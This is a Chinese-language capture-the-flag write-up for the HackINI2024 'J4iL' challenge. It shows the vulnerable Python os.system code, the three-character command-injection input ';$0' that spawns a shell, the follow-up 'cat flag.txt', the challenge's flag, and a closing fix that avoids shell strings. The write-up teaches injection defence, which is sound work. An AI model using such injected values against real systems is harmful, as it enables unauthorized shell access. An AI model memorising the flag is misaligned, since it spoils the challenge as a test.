# HackINI2024 J4iL

## 题目简述

题目是一个 Python 命令执行沙箱。程序分别读取三个输入，但每项只保留一个字符，第三项还必须能转换为浮点数。随后程序把这三个字符直接拼接到 `echo` 命令末尾并交给 `os.system()` 执行，目标是在严格的单字符约束下启动 shell。

## 解题过程

关键代码如下：

```python
a = input("a = ")[0]
b = input("b = ")[0]
c = str(float(input("c = ")))[0]
os.system("echo you cant break me hehe ... " + a + b + c)
```

三个输入依次提交：

```text
;
$
0
```

第三项 `0` 经 `float()` 转换再转回字符串后仍以字符 `0` 开头，最终拼接出的命令为：

```sh
echo you cant break me hehe ... ;$0
```

分号结束前一条命令；在 `sh -c` 的执行环境中，`$0` 展开为当前 shell 的名称或路径，因而后一段会再次启动一个继承标准输入输出的 shell。取得交互后读取题目目录中的文件：

```sh
cat flag.txt
```

实际附件中的 flag 为：

```text
shellmates{e5C4pe_fR0M_py7h0n_70_$h}
```

官方解答文档末尾写成了另一处拼写，但仓库内服务实际读取的 `challenge/flag.txt` 与上面的结果一致，因此应以运行工件为准。

## 方法总结

单字符限制并不能阻止 shell 元字符组合产生语义。这里的三个字符分别承担命令分隔、参数展开和特殊参数名的作用，共同组成 `;$0`。修复时不应把用户输入拼进 shell 字符串；若只需打印文本，应直接使用 Python 输出，或通过不启用 shell 的参数数组调用子进程。
